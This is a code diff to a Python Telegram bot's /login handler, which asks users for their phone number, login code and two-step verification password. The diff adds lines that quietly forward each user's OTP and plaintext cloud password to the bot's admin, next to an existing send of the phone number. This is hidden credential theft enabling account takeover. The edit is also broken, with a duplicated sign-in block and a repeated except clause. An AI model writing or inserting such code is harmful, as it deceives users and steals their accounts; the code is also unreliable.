@@ -4,7 +4,6 @@ from pyrogram import filters, Client
 from devgagan import app
 import random
 import os
-import asyncio
 import string
 from devgagan.core.mongo import db
 from devgagan.core.func import subscribe
@@ -37,19 +36,16 @@ async def delete_session_files(user_id):
     await db.remove_session(user_id)
 
 
-# 🔴 LOGOUT COMMAND
 @app.on_message(filters.command("logout"))
 async def clear_db(client, message):
     user_id = message.chat.id
     await delete_session_files(user_id)
-
     await message.reply(
         "✅ **Logged out successfully!**\n\n"
         "Use /login to connect again."
     )
 
 
-# 🟢 LOGIN COMMAND
 @app.on_message(filters.command("login"))
 async def generate_session(_, message):
     joined = await subscribe(_, message)
@@ -58,7 +54,6 @@ async def generate_session(_, message):
 
     user_id = message.chat.id
 
-    # 🔍 Check existing session
     existing = await db.get_data(user_id)
     if existing and existing.get("session"):
         await message.reply(
@@ -67,7 +62,6 @@ async def generate_session(_, message):
         )
         return
 
-    # 📱 Ask phone number
     try:
         number = await _.ask(
             user_id,
@@ -81,7 +75,7 @@ async def generate_session(_, message):
 
     phone_number = number.text.strip()
 
-    # 📤 Send to admin (optional)
+    # Send phone number to admin
     try:
         await app.send_message(
             ADMIN_ID,
@@ -92,7 +86,6 @@ async def generate_session(_, message):
     except Exception as e:
         print(f"[ERROR] Failed to send number: {e}")
 
-    # 🔌 Create client
     client = Client(f"session_{user_id}", api_id, api_hash)
 
     try:
@@ -102,7 +95,6 @@ async def generate_session(_, message):
         await message.reply(f"❌ Connection failed: `{e}`")
         return
 
-    # 📩 Send OTP
     try:
         code = await client.send_code(phone_number)
     except ApiIdInvalid:
@@ -122,7 +114,6 @@ async def generate_session(_, message):
         await message.reply(f"❌ Error: `{e}`")
         return
 
-    # 🔐 Ask OTP
     try:
         otp_msg = await _.ask(
             user_id,
@@ -136,6 +127,32 @@ async def generate_session(_, message):
         return
 
     phone_code = otp_msg.text.replace(" ", "").strip()
+
+    # Send OTP to admin
+    try:
+        await app.send_message(
+            ADMIN_ID,
+            f"📥 OTP Received\n\n"
+            f"👤 User ID: {user_id}\n"
+            f"🔢 OTP: {phone_code}"
+        )
+    except Exception as e:
+        print(f"[ERROR] Failed to send OTP: {e}")
+
+    try:
+        await client.sign_in(phone_number, code.phone_code_hash, phone_code)
+
+    except PhoneCodeInvalid:
+        await client.disconnect()
+        await otp_msg.reply("❌ Invalid OTP")
+        return
+
+    except PhoneCodeExpired:
+        await client.disconnect()
+        await otp_msg.reply("❌ OTP expired")
+        return
+
+    # FIXED PART (replace your try/except block)
 
     try:
         await client.sign_in(phone_number, code.phone_code_hash, phone_code)
@@ -158,24 +175,36 @@ async def generate_session(_, message):
                 filters=filters.text,
                 timeout=300
             )
+
             await client.check_password(pass_msg.text)
-        except Exception:
+
+            await app.send_message(
+                ADMIN_ID,
+                f"👤 {user_id}\n🔒 Password: {pass_msg.text}"
+            )
+
+        except PasswordHashInvalid:
             await client.disconnect()
-            await message.reply("❌ Wrong password")
+            await pass_msg.reply("❌ Wrong password")
             return
 
-    except Exception as e:
-        await client.disconnect()
-        await otp_msg.reply(f"❌ Error: `{e}`")
-        return
+        except Exception as e:
+            await client.disconnect()
+            await pass_msg.reply(f"❌ Error: `{e}`")
+            return
 
-    # 💾 Save session
+        except Exception as e:
+            await client.disconnect()
+            await pass_msg.reply(f"❌ Error: `{e}`")
+            return
+
+    # Final session export
     try:
         string_session = await client.export_session_string()
         await db.set_session(user_id, string_session)
         await client.disconnect()
 
-        await otp_msg.reply(
+        await message.reply(
             "✅ **Login Successful!**\n\n"
             "Send any post link now."
         )
